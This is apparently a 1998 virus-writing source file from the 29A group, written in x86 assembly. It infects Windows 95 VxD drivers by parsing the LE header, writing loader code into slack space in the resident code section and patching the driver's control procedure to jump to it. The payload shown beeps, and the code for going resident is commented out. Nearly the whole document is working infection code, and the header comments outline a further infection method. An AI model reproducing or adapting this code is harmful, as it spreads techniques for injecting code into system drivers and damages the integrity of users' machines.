;
;                                VxD-infection
;
;  programmed in 1998 by Z0MBiE/29A
;  all rights reserved
;  *** NOT FOR [RE]PUBLISHING/DISASM IN VX-ZINES, EXCEPT 29A ***
;
;  ABOUT THIS PROGRAM
;    infected VxDs (file name given in command line) will beep
;
;    program writes 'OK' if file infected
;    program writes 'X'  if cant disassemble instruction
;       most of control_procs are written using control_dispatch macro, so
;       disassembler must understand not more than 5-10 opcodes...
;
;  INFECTION METHOD: (i think Navrhar-alike)
;
;    1. find DDEEntry
;    2. check its CODE section: it must be RESIDENT, CODE32, etc.
;    3. check enough free space in this CODE section
;    3. patch control_proc:
;        control_proc_x:   [some instructions-with-possible-fixups skipped]
;                          jmp virus
;        virus:            ; restore bytes, return control
;
;  COMMENTS
;    Also VxDs can be infected by adding virus section... but its not easy
;    task, becose all data tables are "packed", i.e. not aligned, so no free
;    space between these tables.
;    But there always exist free space between last data table ("per-page
;      checksum table") and first data page (as a rule LCOD, code section)
;    So its really possible to add one more objectentry to objecttable
;    But if this entry will be added we must add one or more entries to
;    following page-map-table, which also has no free space.
;    When its all will be done, we must _INSERT_ our code section between
;    last data page and non-resident-names-table, which is last in the file.
;    I will try to implement this method in next research, so results
;    will appears in nearest future.
;
;  TO INFECT VxDs-FILES USED:
;    1. sense what VxDs & Windows`95 will be forgotten -
;       and these files will be not infected by me ;)
;    2. talks about Navrhar virus - my greetings to author!
;    3. best music in the world - Scorpions
;    4. some documentation - see directory DOC, its all i found
;         also you can see winnt.h, but only header defined there
;    5. stuff from Reptile/29A - "how to compile VxD"
;    6. TASM, HIEW, IDA
;
;  COMMENTS
;    if you have something to say about VxD format/infection/...,
;    or if you have VxD format description -
;    mail me to z0mbie_29a@yahoo.com
;
;  last updated at  9-08-98
;

include                 INCLUDE\HIEW_VMM.INC    ; VxD services
include                 INCLUDE\VXD_CALL.INC    ; VxDCall/VMMCall macros

include                 INCLUDE\VMM.INC         ; some files from MASM
include                 INCLUDE\IFS.INC

                        model   tiny
                        p386
                        locals  __
                        jumps

;cgroup                  group   code, ldr, vxd
cgroup                  group   code, ldr

code                    segment word use16
                        assume  cs:cgroup, ds:cgroup, es:cgroup, ss:cgroup

                        org     100h

start:
                        mov     si, 0081h       ; command line

__1:                    mov     dx, si          ; skip spaces
                        lodsb
                        cmp     al, 13
                        jz      __exit
                        cmp     al, 32
                        je      __1

__3:                    lodsb                   ; find #13
                        cmp     al, 13
                        je      __2
                        cmp     al, 32
                        jne     __3
__2:                    sub     [si-1], al

                        mov     ah, 60h         ; convert/copy file name
                        mov     si, dx
                        lea     di, filename
                        int     21h

;                       lea     si, filename    ; store filename for
;                       lea     di, ldr_vxd_name; VxD-loader
;                       mov     cx, 128
;                       rep     movsb

                        mov     ax, 3d02h       ; open target file
                        lea     dx, filename
                        int     21h
                        jc      __exit
                        mov     handle, ax

                        lea     dx, mz          ; read MZ header
                        mov     cx, mz_size
                        call    readfile

                        xor     edx, edx        ; seek LE header
                        call    seek_edx_mz

                        lea     dx, le_header   ; read LE header
                        mov     cx, le_size
                        call    readfile

                        cmp     le_magic, 'EL'  ; check for valid LE header
                        jne     __close

                        ; check for valid number of OBJECT ENTRIES
                        cmp     le_object_table_entries, max_objs
                        ja      __close

                        ; check for valid number of PAGES
                        mov     le_number_of_memory_pages, max_pages
                        ja      __close

                        ; seek OBJECT TABLE
                        mov     edx, le_object_table_offset
                        call    seek_edx_mz

                        lea     dx, ot          ; read OBJECT TABLE
                        mov     cx, max_ot_size
                        call    readfile

                        ; seek PAGE MAP TABLE
                        mov     edx, le_object_page_map_table_offset
                        call    seek_edx_mz

                        lea     dx, pmt         ; read PAGE MAP TABLE
                        mov     cx, max_pmt_size
                        call    readfile

                        ; seek ENTRY TABLE
                        mov     edx, le_entry_table_offset
                        call    seek_edx_mz

                        ; read ENTRY TABLE
                        lea     dx, et
                        mov     cx, max_et_size
                        call    readfile

                        ; analyzing only 1st entry

                        ; check entry type
                        cmp     et.byte ptr 1, 11b  ; valid/32bit
                        jnz     __close

                        movzx   edi, et.word ptr 2
                        ; edi=section #, where DDBEntry info located

                        ; si=section offset
                        lea     esi, [edi-1]
                        imul    esi, size oe_struc
                        add     si, offset ot

                        ; check section flags
                        mov     eax, [si].oe_flags
                        and     ax, 0010001101000101b  ; 32-bit, resident,
                        cmp     ax, 0010000001000101b  ; normal, read, exec
                        jnz     __close

                        ; calculate free space in object section
                        mov     ecx, [si].oe_page_map_entries
                        imul    ecx, le_memory_page_size
                        sub     ecx, [si].oe_virtual_segment_size

                        ; check for enough free space
                        cmp     ecx, ldr_size
                        jb      __close

                        ; calculate our PAGE #
                        mov     eax, [si].oe_page_map_index
                        add     eax, [si].oe_page_map_entries
                        dec     eax

                        ; eax = PAGE MAP TABLE entry
                        mov     eax, pmt[eax*4-4]

                        test    eax, 0FF000000h   ; page type: normal
                        jnz     __close

                        ; calculate file offset
                        mov     dx, ax   ; dx = high page number
                        shr     eax, 16  ; eax = low page number
                        xor     ah, ah
                        add     ax, dx
                        dec     ax
                        imul    eax, le_memory_page_size
                        add     eax, le_data_pages_offset
                        ; now EAX=offset of PAGE with our code

                        add     eax, le_memory_page_size
                        sub     eax, ecx
                        ; now EAX=offset of OUR CODE in file

                        mov     our_offs, eax

                        ; increase section`s code size
                        add     [si].oe_virtual_segment_size, ldr_size

                        ; convert section # to file offset

                        mov     edx, pmt[edi*4-4]
                        mov     ax, dx
                        shr     edx, 16
                        xor     dh, dh
                        add     dx, ax
                        dec     dx
                        imul    edx, le_memory_page_size
                        add     edx, le_data_pages_offset
                        ; now EDX=offset of our section
                        mov     sect_offs, edx

                        add     edx, et.dword ptr 5
                        ; now EDX=offset of DDB Entry

                        ; seek DDBEntry
                        call    seek_edx

                        ; read DDBEntry
                        lea     dx, ddb
                        mov     cx, max_ddb_size
                        call    readfile

                        mov     edx, ddb.dword ptr 18h ; control_proc_X
                        ;; maybe its mistake
                        sub     edx, [si].oe_relocation_base_address
                        ;;
                        add     edx, sect_offs
                        ; now EDX=offset of control_proc_X in FILE
                        mov     cp_offs, edx

                        ; seek control_proc_X
                        call    seek_edx

                        lea     dx, cp          ; read control_proc_X
                        mov     cx, max_cp_size
                        call    readfile

                        ; analyze control_proc_x

                        lea     si, cp

__restart:              mov     di, si    ; pointer to byte to patch
                        xor     bx, bx    ; "free" space counter

__nextcmd:              cmp     si, offset cp + max_cp_size
                        jae     __close

                        mov     ax, [si]
                        call    get_cmd_size
                        jc      __close

                        add     si, cx

                        or      dx, dx
                        jnz     __restart

                        add     bx, cx
                        cmp     bx, 5
                        jb      __nextcmd

__patch:                ; okey, space found - calculate some values
                        ; to restore normal execution in VxD

                        mov     eax, sect_offs
                        sub     eax, our_offs
                        mov     save_0, eax

                        mov     al, [di]
                        mov     save_2, al
                        mov     eax, [di+1]
                        mov     save_4, eax

                        sub     di, offset cp
                        movzx   edi, di

                        mov     eax, edi
                        add     eax, ddb.dword ptr 18h
                        mov     save_1, eax
                        inc     eax
                        mov     save_3, eax

                        mov     eax, our_offs
                        add     eax, save_5-ldr_start+4
                        sub     eax, edi
                        sub     eax, cp_offs
                        neg     eax
                        mov     save_5, eax

                        mov     eax, our_offs
                        add     eax, ldr_entry - ldr_start
                        sub     eax, edi
                        sub     eax, cp_offs
                        sub     eax, 5

                        ; jmp to our code
                        mov     cp[edi].byte ptr 0, 0E9h
                        mov     cp[edi].dword ptr 1, eax

                        ; well, thats all - control_x_patches,
                        ; "save_x"-values calculated

;                       mov     ax, 4202h       ; seek end-of-file
;                       mov     bx, handle
;                       xor     cx, cx
;                       cwd
;                       int     21h
;
;                       ; store file position
;                       mov     vxd_pos.word ptr 2, dx
;                       mov     vxd_pos.word ptr 0, ax
;
;                       mov     ah, 40h         ; write main code
;                       lea     dx, vxd_start
;                       mov     cx, vxd_size
;                       int     21h

                        ; seek file (free space in code section)
                        mov     edx, our_offs
                        call    seek_edx

                        ; write our code
                        lea     dx, ldr_start
                        mov     cx, ldr_size
                        call    writefile

                        ; seek OBJECT TABLE
                        mov     edx, le_object_table_offset
                        call    seek_edx_mz

                        ; write OBJECT TABLE
                        ; - only one change made, physical section size
                        ;   increased by loader size
                        lea     dx, ot
                        mov     ecx, le_object_table_entries
                        imul    ecx, size oe_struc
                        call    writefile

                        ; seek control_proc_X
                        mov     edx, cp_offs
                        call    seek_edx

                        lea     dx, cp          ; write control_proc_X
                        mov     cx, max_cp_size
                        call    writefile

                        mov     al, 'O'         ; success
                        int     29h
                        mov     al, 'K'
                        int     29h

__close:                mov     ah, 3eh         ; close file
                        mov     bx, handle
                        int     21h

__exit:                 mov     ax, 4c00h       ; exit to DOS
                        int     21h


                        ; this is small disassembler
                        ;
                        ; input:
                        ;   al=opcode (byte ptr 0)
                        ;   ah=opcode (byte ptr 1)
                        ;
                        ; output:
                        ;   CF=0:  success
                        ;            cx = command size
                        ;            dx:
                        ;              0  normal command
                        ;              1  command may contain fixups
                        ;   CF=1:  error
                        ;            cx/dx modified
                        ;

get_cmd_size:           xor     dx, dx

                        mov     cx, 2

                        push    ax              ; jcc xx
                        and     al, 0F0h
                        cmp     al, 070h
                        pop     ax
                        je      __rt

                        mov     cx, 3

                        cmp     ax, 0E883h      ; sub eax, xx
                        je      __rt
                        cmp     ax, 0F883h      ; cmp eax, xx
                        je      __rt

                        mov     cx, 6

                        push    ax
                        and     ax, 0F0FFh
                        cmp     ax, 0800Fh
                        pop     ax
                        je      __rt

                        mov     cx, 7

                        inc     dx
                        cmp     ax, 005F6h  ; test byte ptr [yyyyyyyy], xx
                        je      __rt
                        dec     dx

                        mov     al, 'X'     ; unknown command
                        int     29h

                        stc
                        ret

__rt:                   clc
                        ret

readfile:               pusha                   ; readfile
                        mov     ah, 3fh
                        mov     bx, handle
                        int     21h
                        popa
                        ret

writefile:              pusha                   ; writefile
                        mov     ah, 40h
                        mov     bx, handle
                        int     21h
                        popa
                        ret

seek_edx_mz:            add     edx, mz_neptr   ; seek(edx). newexe-based

seek_edx:               pusha                   ; seek(edx)
                        push    edx
                        pop     dx
                        pop     cx
                        mov     ax, 4200h
                        mov     bx, handle
                        int     21h
                        popa
                        ret


filename                db      256 dup (?)   ; file we`re infecting

handle                  dw      ?   ; current file handle

sect_offs               dd      ?   ; offset of our section     [ABSOLUTE]

                        ; following 2 dwords
                        ; are useful for STEALTH technology

cp_offs                 dd      ?   ; offset of control_proc_x  [ABSOLUTE]
our_offs                dd      ?   ; offset of our code        [ABSOLUTE]

mz:
mz_mz                   dw      ?
mz_last512              dw      ?
mz_num512               dw      ?
mz_relnum               dw      ?
mz_headersize           dw      ?
mz_minmem               dw      ?
mz_maxmem               dw      ?
mz_ss                   dw      ?
mz_sp                   dw      ?
mz_checksum             dw      ?
mz_ip                   dw      ?
mz_cs                   dw      ?
mz_relofs               dw      ?
mz_ovrnum               dw      ?
mz_reserved             db      32 dup (?)
mz_neptr                dd      ?
mz_size                 equ     $-mz

le_header:
le_magic                                dw      ?
le_byte_order                           db      ?
le_word_order                           db      ?
le_exec_format_level                    dd      ?
le_cpu_type                             dw      ?
le_target_os                            dw      ?
le_module_version                       dd      ?
le_module_type_flags                    dd      ?
le_number_of_memory_pages               dd      ?
le_initial_cs                           dd      ?
le_initial_eip                          dd      ?
le_initial_ss                           dd      ?
le_initial_esp                          dd      ?
le_memory_page_size                     dd      ?
le_bytes_on_last_page                   dd      ?
le_fixup_section_size                   dd      ?
le_fixup_section_checksum               dd      ?
le_loader_section_size                  dd      ?
le_loader_section_checksum              dd      ?
le_object_table_offset                  dd      ?
le_object_table_entries                 dd      ?
le_object_page_map_table_offset         dd      ?
le_object_iterate_data_map_offset       dd      ?
le_resource_table_offset                dd      ?
le_resource_table_entries               dd      ?
le_resident_names_table_offset          dd      ?
le_entry_table_offset                   dd      ?
le_module_directives_table_offset       dd      ?
le_module_directives_table_entries      dd      ?
le_fixup_page_table_offset              dd      ?
le_fixup_record_table_offset            dd      ?
le_imported_module_names_table_offset   dd      ?
le_imported_modules_count               dd      ?
le_imported_procedure_name_table_offset dd      ?
le_per_page_checksum_table_offset       dd      ?
le_data_pages_offset                    dd      ?
le_preload_page_count                   dd      ?
le_nonresident_names_table_offset       dd      ?
le_nonresident_names_table_length       dd      ?
le_nonresident_names_table_checksum     dd      ?
le_automatic_data_object                dd      ?
le_debug_information_offset             dd      ?
le_debug_information_length             dd      ?
le_preload_instance_pages_number        dd      ?
le_demand_instance_pages_number         dd      ?
le_extra_heap_allocation                dd      ?
le_unknown                              dd      ?
le_size                 equ     $-le_header

                        ; vxd`s object table object entry structure

oe_struc                struc
oe_virtual_segment_size                 dd      ?
oe_relocation_base_address              dd      ?
oe_flags                                dd      ?
oe_page_map_index                       dd      ?
oe_page_map_entries                     dd      ?
oe_reserved                             dd      ?
                        ends

                        ; vxd`s object table
max_objs                equ     32
ot                      oe_struc   max_objs dup (?)
max_ot_size             equ        $-ot

                        ; page-map table
max_pages               equ     64
pmt                     dd      max_pages dup (?)
max_pmt_size            equ     $-pmt

                        ; entry-table (really its not a table)
max_et_size             equ     256
et                      db      max_et_size dup (?)

                        ; DDBEntry structure
max_ddb_size            equ     64
ddb                     db      max_ddb_size dup (?)

                        ; control_proc_x we`re patching
max_cp_size             equ     256
cp                      db      max_cp_size dup (?)

                        align   16      ; important!
code                    ends

ldr                     segment word use32     ; 32-bit VxD-loader
                        assume  cs:ldr, ds:ldr, es:ldr, ss:ldr

ldr_start:              nop

ldr_entry:              pushf           ; <- important
                        pushad

                        call    entry   ; where am i?
entry:                  pop     ebp
                        sub     ebp, entry - ldr_start

                        lea     eax, [ebp+12345678h]  ; make EAX points to
save_0                  equ     dword ptr $-4         ; section beginning

                        ; restore original bytes

                        ; can anybody explain it?
                        ; section attributes was exec+readonly, i.e.
                        ; not writeable, but following patch works

                        mov     byte  ptr ds:[eax+12345678h], 12h
save_1                  equ     dword ptr $-5
save_2                  equ     byte  ptr $-1

                        mov     dword ptr ds:[eax+12345678h], 12345678h
save_3                  equ     dword ptr $-8
save_4                  equ     dword ptr $-4

                        call    beep

;                       ; now control_proc_x restored, and we can
;                       ; go resident
;
;                       ; alloocate some memory
;                       push    PAGEFIXED + PAGEZEROINIT  ; flags
;                       push    0        ; PhysAddr      @dword, unused
;                       push    0        ; maxPhys       max page #, unused
;                       push    0        ; minPhys       min page #, unused
;                       push    0Fh      ; ALignMask     64k-aligned
;                       push    0        ; VM            0 if pType=PG_SYS
;                       push    PG_SYS   ; pType         alloc in sys area
;                       push    vxd_pages; nPages        page count
;                       VMMcall PageAllocate
;                       add     esp, 4*8
;
;                       mov     ecx, eax
;                       or      ecx, edx
;                       jz      __error
;
;                     ; mov     pagehandle[ebp], eax
;                     ; mov     pageaddress[ebp], edx
;
;                       mov     edi, edx   ; edi = our address
;
;                       int 3
;
;                       lea     edx, ldr_vxd_name[ebp]
;                       VMMcall OpenFile
;                       jc      __error
;                       xchg    ebx, eax

__error:                popad
                        popf

                        db      0e9h
save_5                  dd      12345678h

beep:                   in      al, 0B6h
                        out     43h, al

                        mov     ax, 123456h/3300    ; 3300 Hz
                        out     42h, al
                        mov     al, ah
                        out     42h, al

                        in      al, 61h
                        or      al, 3
                        out     61h, al

                        mov     ecx, 3000000
__1:                    nop
                        loop    __1

                        in      al, 61h
                        and     al, not 3
                        out     61h, al

                        ret

;ldr_vxd_name            db      128 dup ('?')

ldr_end:
ldr_size                equ     ldr_end - ldr_start

                        align   16      ; important!
ldr                     ends

;vxd                     segment word use32     ; 32-bit VxD-handler
;                        assume  cs:vxd, ds:vxd, es:vxd, ss:vxd
;
;vxd_start:
;
;                        nop
;                        nop
;                        nop
;
;vxd_end:
;vxd_size                equ     vxd_end - vxd_start
;vxd_pages               equ     (vxd_size + 4095) / 4096
;vxd                     ends
;
                         end     start



